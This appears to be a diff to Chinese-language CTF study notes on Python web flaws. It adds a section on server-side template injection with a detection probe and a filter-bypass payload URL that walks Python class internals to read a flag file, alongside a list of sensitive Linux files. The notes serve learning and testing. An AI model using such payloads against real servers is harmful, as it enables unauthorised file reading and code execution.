@@ -15,7 +15,15 @@
 
 ## SSTI
 
-SSTI 是服务端模板注入的缩写（Server Side Template Injection）
+SSTI 是服务端模板注入的缩写（Server Side Template Injection）。判断是否存在 SSTI 漏洞可以使用 `{{1%2b1}}` 这个表达式，如果页面能输出 2 这个结果，表示页面可能存在 SSTI 漏洞。
+
+可以使用一些方式绕过敏感词过滤
+
+```http
+http://xxx.xxx.xxx.xxx/index.php/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
+```
+
+
 
 ## 系统的敏感文件
 
@@ -28,6 +36,7 @@ Linux 中一些敏感的系统文件。
 /etc/hosts
 /proc/self/cmdline
 ```
+
 
 
 
@@ -44,3 +53,4 @@ Linux 中一些敏感的系统文件。
 1. [一文掌握CTF中Python全部考点](https://www.freebuf.com/column/232197.html)
 1. [警惕Python中的路径穿越](https://blog.csdn.net/qq_36078992/article/details/122070641)
 1. [[83：CTF夺旗-Python考点SSTI&反序列化&字符串](https://www.cnblogs.com/zhengna/p/15798046.html)](https://www.cnblogs.com/zhengna/p/15798046.html)
+1. [python SSTI(服务端模板注入)](https://www.cnblogs.com/zpchcbd/p/15881573.html)
